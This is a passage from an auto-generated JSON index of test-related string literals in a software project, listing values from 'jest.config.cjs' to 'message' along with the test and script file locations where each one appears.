    "jest.config.cjs": {
      "value": "jest.config.cjs",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:182",
        "scripts/unified_test_runner.py:95"
      ]
    },
    "jest.fn()": {
      "value": "jest.fn()",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:393"
      ]
    },
    "jest.mock(": {
      "value": "jest.mock(",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:394"
      ]
    },
    "jest.setup.js": {
      "value": "jest.setup.js",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:563"
      ]
    },
    "jest.setup.real.js": {
      "value": "jest.setup.real.js",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:555"
      ]
    },
    "jest\\.fn\\(\\)": {
      "value": "jest\\.fn\\(\\)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:69"
      ]
    },
    "jest\\.mock\\(": {
      "value": "jest\\.mock\\(",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:70"
      ]
    },
    "jest\\.mock\\([\\'\"`][^\\'\"`]+[\\'\"`],\\s*\\(\\)\\s*=>\\s*\\(\\{[\\s\\S]+?return\\s*<div": {
      "value": "jest\\.mock\\([\\'\"`][^\\'\"`]+[\\'\"`],\\s*\\(\\)\\s*=>\\s*\\(\\{[\\s\\S]+?return\\s*<div",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:77"
      ]
    },
    "journeys": {
      "value": "journeys",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:112"
      ]
    },
    "js_excessive_mocking": {
      "value": "js_excessive_mocking",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:400",
        "scripts/compliance/real_test_requirements_enforcer.py:516"
      ]
    },
    "js_function_size": {
      "value": "js_function_size",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:447"
      ]
    },
    "js_mock_component": {
      "value": "js_mock_component",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:382",
        "scripts/compliance/real_test_requirements_enforcer.py:515"
      ]
    },
    "json": {
      "value": "json",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:40",
        "auth_service/tests/utils/test_client.py:61",
        "auth_service/tests/utils/test_client.py:82",
        "auth_service/tests/utils/test_client.py:97",
        "auth_service/tests/utils/test_client.py:115",
        "auth_service/tests/utils/test_client.py:127",
        "auth_service/tests/utils/test_client.py:150",
        "auth_service/tests/utils/test_client.py:172",
        "auth_service/tests/utils/test_client.py:187",
        "auth_service/tests/utils/test_client.py:205"
      ]
    },
    "json_output": {
      "value": "json_output",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:145"
      ]
    },
    "json_output_format": {
      "value": "json_output_format",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:169"
      ]
    },
    "jti": {
      "value": "jti",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:42",
        "auth_service/tests/factories/token_factory.py:136",
        "auth_service/tests/test_auth_token_validation.py:101",
        "auth_service/tests/test_auth_token_validation.py:175",
        "auth_service/tests/test_auth_token_validation.py:252",
        "auth_service/tests/test_auth_token_validation.py:278",
        "auth_service/tests/unified/test_jwt_validation.py:182"
      ]
    },
    "justification": {
      "value": "justification",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:642"
      ]
    },
    "justified": {
      "value": "justified",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:107",
        "scripts/analyze_test_mocks.py:128",
        "scripts/analyze_test_mocks.py:158"
      ]
    },
    "jwt": {
      "value": "jwt",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:44"
      ]
    },
    "jwt-secret-key": {
      "value": "jwt-secret-key",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:141"
      ]
    },
    "jwt.get_unverified_header": {
      "value": "jwt.get_unverified_header",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:82",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:91",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:102",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:136",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:145",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:154",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:174",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:190",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:201",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:240"
      ]
    },
    "jwt_handler": {
      "value": "jwt_handler",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:168",
        "auth_service/tests/base/test_mixins.py:180",
        "auth_service/tests/base/test_mixins.py:181",
        "auth_service/tests/base/test_mixins.py:182"
      ]
    },
    "jwt_secret_consistency": {
      "value": "jwt_secret_consistency",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:286",
        "auth_service/tests/test_five_whys_reproduction.py:307"
      ]
    },
    "jwt_secret_key": {
      "value": "jwt_secret_key",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:93",
        "scripts/test_staging_config.py:125"
      ]
    },
    "largest_file": {
      "value": "largest_file",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:83",
        "scripts/compliance/test_size_validator.py:98",
        "scripts/compliance/test_size_validator.py:99",
        "scripts/compliance/test_size_validator.py:426",
        "scripts/compliance/test_size_validator.py:428",
        "scripts/compliance/test_size_validator.py:428"
      ]
    },
    "largest_function": {
      "value": "largest_function",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:84",
        "scripts/compliance/test_size_validator.py:108",
        "scripts/compliance/test_size_validator.py:109",
        "scripts/compliance/test_size_validator.py:430",
        "scripts/compliance/test_size_validator.py:432",
        "scripts/compliance/test_size_validator.py:432",
        "scripts/compliance/test_size_validator.py:432"
      ]
    },
    "last_activity": {
      "value": "last_activity",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/session_factory.py:40",
        "auth_service/tests/test_session_management.py:80",
        "auth_service/tests/test_session_management.py:100",
        "auth_service/tests/test_session_management.py:128",
        "auth_service/tests/test_session_management.py:142",
        "auth_service/tests/test_session_management.py:167"
      ]
    },
    "latency_distribution": {
      "value": "latency_distribution",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:91",
        "netra_backend/app/services/realistic_test_data/models.py:33",
        "netra_backend/app/services/realistic_test_data/models.py:43",
        "netra_backend/app/services/realistic_test_data/models.py:53",
        "netra_backend/app/services/realistic_test_data/models.py:63",
        "netra_backend/app/services/realistic_test_data/models.py:73"
      ]
    },
    "latency_ms": {
      "value": "latency_ms",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:110",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:199",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:306",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:307",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:349",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:403"
      ]
    },
    "latency_p50_ms": {
      "value": "latency_p50_ms",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:123",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:206"
      ]
    },
    "latency_p95_ms": {
      "value": "latency_p95_ms",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:123",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:207"
      ]
    },
    "latency_range_ms": {
      "value": "latency_range_ms",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:90",
        "netra_backend/app/services/realistic_test_data/models.py:32",
        "netra_backend/app/services/realistic_test_data/models.py:42",
        "netra_backend/app/services/realistic_test_data/models.py:52",
        "netra_backend/app/services/realistic_test_data/models.py:62",
        "netra_backend/app/services/realistic_test_data/models.py:72"
      ]
    },
    "latest/unit_report.md": {
      "value": "latest/unit_report.md",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:38"
      ]
    },
    "latin-1": {
      "value": "latin-1",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:230",
        "scripts/fix_all_test_issues.py:257",
        "scripts/fix_all_test_issues.py:280"
      ]
    },
    "legacy": {
      "value": "legacy",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:226"
      ]
    },
    "legacy test files...": {
      "value": "legacy test files...",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:287"
      ]
    },
    "legacy_framework": {
      "value": "legacy_framework",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:161",
        "scripts/autonomous_review/test_reviewer.py:170"
      ]
    },
    "length": {
      "value": "length",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:113",
        "scripts/check_test_compliance.py:61",
        "scripts/check_test_compliance.py:177"
      ]
    },
    "level": {
      "value": "level",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:51",
        "scripts/analyze_test_mocks.py:16",
        "scripts/analyze_test_mocks.py:17",
        "scripts/analyze_test_mocks.py:18",
        "scripts/analyze_test_mocks.py:19",
        "scripts/analyze_test_mocks.py:20",
        "scripts/analyze_test_mocks.py:21",
        "scripts/analyze_test_mocks.py:22",
        "scripts/analyze_test_mocks.py:23",
        "scripts/analyze_test_mocks.py:24"
      ]
    },
    "lib": {
      "value": "lib",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:27"
      ]
    },
    "lib64": {
      "value": "lib64",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:27"
      ]
    },
    "limit-test-": {
      "value": "limit-test-",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:159"
      ]
    },
    "line": {
      "value": "line",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:106",
        "scripts/analyze_test_mocks.py:127",
        "scripts/analyze_test_mocks.py:178"
      ]
    },
    "line limit": {
      "value": "line limit",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:193",
        "scripts/compliance/test_size_validator.py:232"
      ]
    },
    "line limit (SPEC/testing.xml)": {
      "value": "line limit (SPEC/testing.xml)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:112"
      ]
    },
    "line limit:": {
      "value": "line limit:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:421",
        "scripts/compliance/test_size_validator.py:422"
      ]
    },
    "line limit:**": {
      "value": "line limit:**",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:460",
        "scripts/compliance/test_size_validator.py:461"
      ]
    },
    "line_number": {
      "value": "line_number",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:310",
        "scripts/compliance/test_size_validator.py:328"
      ]
    },
    "linear_decline": {
      "value": "linear_decline",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:98"
      ]
    },
    "lineno": {
      "value": "lineno",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:135",
        "scripts/compliance/project_test_validator.py:141",
        "scripts/compliance/real_test_requirements_enforcer.py:200",
        "scripts/compliance/real_test_validator.py:96"
      ]
    },
    "lines": {
      "value": "lines",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:237",
        "scripts/auto_fix_test_violations.py:249",
        "scripts/auto_fix_test_violations.py:274",
        "scripts/auto_fix_test_violations.py:294",
        "scripts/auto_fix_test_violations.py:307",
        "scripts/check_test_compliance.py:111",
        "scripts/check_test_compliance.py:167",
        "scripts/check_test_compliance.py:167",
        "scripts/check_test_compliance.py:177",
        "scripts/compliance/demo_test_size_enforcement.py:88"
      ]
    },
    "lines (+": {
      "value": "lines (+",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:83",
        "scripts/compliance/test_violations_reporter.py:123"
      ]
    },
    "lines (limit:": {
      "value": "lines (limit:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:193",
        "scripts/compliance/test_limits_checker.py:209",
        "scripts/compliance/test_size_validator.py:364"
      ]
    },
    "lines (max:": {
      "value": "lines (max:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:156"
      ]
    },
    "lines and should be manually reviewed.": {
      "value": "lines and should be manually reviewed.",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:610"
      ]
    },
    "lines)": {
      "value": "lines)",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:256",
        "scripts/auto_fix_test_sizes.py:259",
        "scripts/auto_fix_test_sizes.py:445",
        "scripts/auto_fix_test_sizes.py:653",
        "scripts/compliance/demo_test_size_enforcement.py:100",
        "scripts/compliance/test_fixer.py:362",
        "scripts/compliance/test_refactor_helper.py:725"
      ]
    },
    "lines) manually": {
      "value": "lines) manually",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:622"
      ]
    },
    "lines):": {
      "value": "lines):",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:261"
      ]
    },
    "lines, exceeds 25-line limit": {
      "value": "lines, exceeds 25-line limit",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:251",
        "scripts/compliance/real_test_requirements_enforcer.py:329",
        "scripts/compliance/real_test_validator.py:213"
      ]
    },
    "lines, exceeds 450-line limit": {
      "value": "lines, exceeds 450-line limit",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:156",
        "scripts/compliance/real_test_requirements_enforcer.py:222",
        "scripts/compliance/real_test_validator.py:111"
      ]
    },
    "lines, exceeds reasonable limit": {
      "value": "lines, exceeds reasonable limit",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:448"
      ]
    },
    "lines, limit is": {
      "value": "lines, limit is",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:213"
      ]
    },
    "lint": {
      "value": "lint",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:314"
      ]
    },
    "llama-2-70b": {
      "value": "llama-2-70b",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:71"
      ]
    },
    "llm": {
      "value": "llm",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:40",
        "scripts/auto_fix_test_sizes.py:354",
        "scripts/business_value_test_index.py:441"
      ]
    },
    "llm_calls": {
      "value": "llm_calls",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:21",
        "scripts/real_service_test_metrics.py:42",
        "scripts/real_service_test_metrics.py:144",
        "scripts/real_service_test_metrics.py:147",
        "scripts/real_service_test_metrics.py:148"
      ]
    },
    "llm_configs": {
      "value": "llm_configs",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:77",
        "scripts/test_staging_config.py:102"
      ]
    },
    "llm_costs": {
      "value": "llm_costs",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:22",
        "scripts/real_service_test_metrics.py:46",
        "scripts/real_service_test_metrics.py:100",
        "scripts/real_service_test_metrics.py:149"
      ]
    },
    "llm_manager = LLMManager()": {
      "value": "llm_manager = LLMManager()",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:50"
      ]
    },
    "llm_manager = Mock()": {
      "value": "llm_manager = Mock()",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:48"
      ]
    },
    "llm_responses": {
      "value": "llm_responses",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:12"
      ]
    },
    "llm_services": {
      "value": "llm_services",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:17",
        "scripts/analyze_test_mocks.py:41"
      ]
    },
    "load": {
      "value": "load",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:348",
        "scripts/business_value_test_index.py:90",
        "scripts/business_value_test_index.py:464"
      ]
    },
    "load_test_config": {
      "value": "load_test_config",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/__init__.py:9"
      ]
    },
    "local": {
      "value": "local",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:75",
        "auth_service/tests/integration/test_oauth_flows_sync.py:128",
        "auth_service/tests/test_security.py:148",
        "auth_service/tests/test_security.py:160",
        "auth_service/tests/test_security.py:258",
        "auth_service/tests/test_security.py:293",
        "auth_service/tests/test_security.py:360",
        "auth_service/tests/test_security.py:410",
        "auth_service/tests/test_security.py:446",
        "auth_service/tests/test_security.py:461"
      ]
    },
    "localhost": {
      "value": "localhost",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:33",
        "auth_service/tests/config/test_settings.py:27",
        "auth_service/tests/config/test_settings.py:71",
        "auth_service/tests/database/test_config.py:105",
        "auth_service/tests/database/test_config.py:117",
        "auth_service/tests/database/test_config.py:142",
        "auth_service/tests/test_critical_oauth_environment_failures.py:355",
        "auth_service/tests/test_critical_staging_issues.py:232",
        "auth_service/tests/test_database_authentication_failures.py:47",
        "auth_service/tests/test_database_authentication_failures.py:84"
      ]
    },
    "localhost in staging URL": {
      "value": "localhost in staging URL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:256"
      ]
    },
    "localhost,127.0.0.1,0.0.0.0": {
      "value": "localhost,127.0.0.1,0.0.0.0",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:55"
      ]
    },
    "localhost:": {
      "value": "localhost:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:376"
      ]
    },
    "localhost:5432": {
      "value": "localhost:5432",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_cloud_sql_url.py:93"
      ]
    },
    "localhost:5432/auth_db": {
      "value": "localhost:5432/auth_db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:53"
      ]
    },
    "localhost_in_staging": {
      "value": "localhost_in_staging",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:363"
      ]
    },
    "location": {
      "value": "location",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_sync.py:40",
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:57",
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:60",
        "scripts/test_oauth_local.py:191"
      ]
    },
    "lock_reason": {
      "value": "lock_reason",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:193"
      ]
    },
    "log_async_checkout": {
      "value": "log_async_checkout",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:123",
        "auth_service/tests/test_postgres_compliance.py:134"
      ]
    },
    "log_patterns": {
      "value": "log_patterns",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:13"
      ]
    },
    "login": {
      "value": "login",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:139",
        "auth_service/tests/factories/token_factory.py:223",
        "auth_service/tests/integration/test_auth_oauth_errors.py:143",
        "auth_service/tests/integration/test_oauth_flows_auth.py:37",
        "auth_service/tests/integration/test_oauth_flows_auth.py:48",
        "auth_service/tests/integration/test_oauth_flows_core.py:48",
        "auth_service/tests/integration/test_oauth_flows_core.py:59",
        "auth_service/tests/integration/test_oauth_flows_sync.py:33",
        "auth_service/tests/integration/test_oauth_flows_sync.py:139",
        "auth_service/tests/utils/test_client.py:193"
      ]
    },
    "login_failed": {
      "value": "login_failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:20"
      ]
    },
    "login_method": {
      "value": "login_method",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:75"
      ]
    },
    "login_success": {
      "value": "login_success",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:19"
      ]
    },
    "lognormal": {
      "value": "lognormal",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:125",
        "netra_backend/app/services/realistic_test_data/models.py:33",
        "netra_backend/app/services/realistic_test_data/models.py:43"
      ]
    },
    "logout": {
      "value": "logout",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:21",
        "auth_service/tests/integration/test_oauth_flows_auth.py:48",
        "auth_service/tests/integration/test_oauth_flows_core.py:59",
        "auth_service/tests/integration/test_oauth_flows_sync.py:139",
        "auth_service/tests/utils/test_client.py:194"
      ]
    },
    "logout_type": {
      "value": "logout_type",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:107"
      ]
    },
    "long": {
      "value": "long",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:452"
      ]
    },
    "long-running-token-for-shutdown-test": {
      "value": "long-running-token-for-shutdown-test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:466"
      ]
    },
    "low": {
      "value": "low",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:331",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:473",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:493",
        "scripts/compliance/fake_test_scanner.py:210",
        "scripts/compliance/fake_test_scanner.py:212",
        "scripts/compliance/fake_test_scanner.py:265"
      ]
    },
    "low error rate": {
      "value": "low error rate",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:104"
      ]
    },
    "low_test_count": {
      "value": "low_test_count",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:660"
      ]
    },
    "low_throughput": {
      "value": "low_throughput",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:371"
      ]
    },
    "low_tier_coverage": {
      "value": "low_tier_coverage",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:678"
      ]
    },
    "m=": {
      "value": "m=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:111"
      ]
    },
    "main_db_sync.py": {
      "value": "main_db_sync.py",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:19"
      ]
    },
    "main_password": {
      "value": "main_password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:116"
      ]
    },
    "main_user": {
      "value": "main_user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:115",
        "auth_service/tests/test_database_connection_validation.py:129"
      ]
    },
    "major": {
      "value": "major",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:157",
        "scripts/compliance/project_test_validator.py:252",
        "scripts/compliance/project_test_validator.py:288",
        "scripts/compliance/project_test_validator.py:313",
        "scripts/compliance/project_test_validator.py:327",
        "scripts/compliance/project_test_validator.py:339",
        "scripts/compliance/real_test_linter.py:109",
        "scripts/compliance/real_test_linter.py:114",
        "scripts/compliance/real_test_linter.py:141",
        "scripts/compliance/real_test_requirements_enforcer.py:222"
      ]
    },
    "major violations to address soon": {
      "value": "major violations to address soon",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:557"
      ]
    },
    "malformed": {
      "value": "malformed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:512"
      ]
    },
    "malformed.token": {
      "value": "malformed.token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:141"
      ]
    },
    "malformed_response": {
      "value": "malformed_response",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:128"
      ]
    },
    "malicious_data": {
      "value": "malicious_data",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:462"
      ]
    },
    "malicious_headers": {
      "value": "malicious_headers",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:99",
        "auth_service/tests/test_security.py:695"
      ]
    },
    "manager": {
      "value": "manager",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:365"
      ]
    },
    "managers": {
      "value": "managers",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:366"
      ]
    },
    "manual_review": {
      "value": "manual_review",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:80",
        "scripts/fix_test_batch.py:312"
      ]
    },
    "mark": {
      "value": "mark",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:194",
        "scripts/business_value_test_index.py:233",
        "scripts/business_value_test_index.py:245"
      ]
    },
    "markdown": {
      "value": "markdown",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:407",
        "scripts/compliance/test_size_validator.py:519",
        "scripts/real_service_test_metrics.py:113"
      ]
    },
    "markers": {
      "value": "markers",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:24",
        "scripts/unified_test_config.py:32",
        "scripts/unified_test_config.py:40",
        "scripts/unified_test_config.py:48",
        "scripts/unified_test_config.py:56",
        "scripts/unified_test_config.py:64",
        "scripts/unified_test_config.py:344",
        "scripts/unified_test_config.py:345"
      ]
    },
    "max": {
      "value": "max",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:95",
        "scripts/real_service_test_metrics.py:187"
      ]
    },
    "max_error_rate": {
      "value": "max_error_rate",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:215"
      ]
    },
    "max_latency_p50_ms": {
      "value": "max_latency_p50_ms",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:215"
      ]
    },
    "max_latency_p95_ms": {
      "value": "max_latency_p95_ms",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:215"
      ]
    },
    "max_workers": {
      "value": "max_workers",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:177",
        "scripts/test_backend_optimized.py:184",
        "scripts/test_backend_optimized.py:191",
        "scripts/unified_test_runner.py:584"
      ]
    },
    "may still exceed line limits": {
      "value": "may still exceed line limits",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:628"
      ]
    },
    "medical_qa": {
      "value": "medical_qa",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:42"
      ]
    },
    "medium": {
      "value": "medium",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:333",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:492",
        "scripts/business_value_test_index.py:662",
        "scripts/compliance/fake_test_scanner.py:205",
        "scripts/compliance/fake_test_scanner.py:207",
        "scripts/compliance/fake_test_scanner.py:265"
      ]
    },
    "memory": {
      "value": "memory",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:352"
      ]
    },
    "memory_aware": {
      "value": "memory_aware",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:67"
      ]
    },
    "memory_intensive": {
      "value": "memory_intensive",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:903"
      ]
    },
    "memory_leak": {
      "value": "memory_leak",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:78",
        "netra_backend/app/services/realistic_test_data/log_generator.py:115",
        "netra_backend/app/services/realistic_test_data/log_generator.py:145",
        "netra_backend/app/services/realistic_test_data/models.py:87",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:30"
      ]
    },
    "memory_mb": {
      "value": "memory_mb",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:147",
        "netra_backend/app/services/realistic_test_data/log_generator.py:178",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:207",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:324",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:325",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:364",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:394"
      ]
    },
    "memory_per_worker_mb": {
      "value": "memory_per_worker_mb",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:178",
        "scripts/test_backend_optimized.py:185",
        "scripts/test_backend_optimized.py:192"
      ]
    },
    "memory_pressure": {
      "value": "memory_pressure",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:365",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:445"
      ]
    },
    "message": {
      "value": "message",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:69",
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:69",
        "netra_backend/app/services/realistic_test_data/log_generator.py:53",
        "netra_backend/app/services/realistic_test_data/models.py:113",
        "netra_backend/app/services/realistic_test_data/models.py:119",
        "netra_backend/app/services/realistic_test_data/models.py:124",
        "netra_backend/app/services/realistic_test_data/models.py:130",
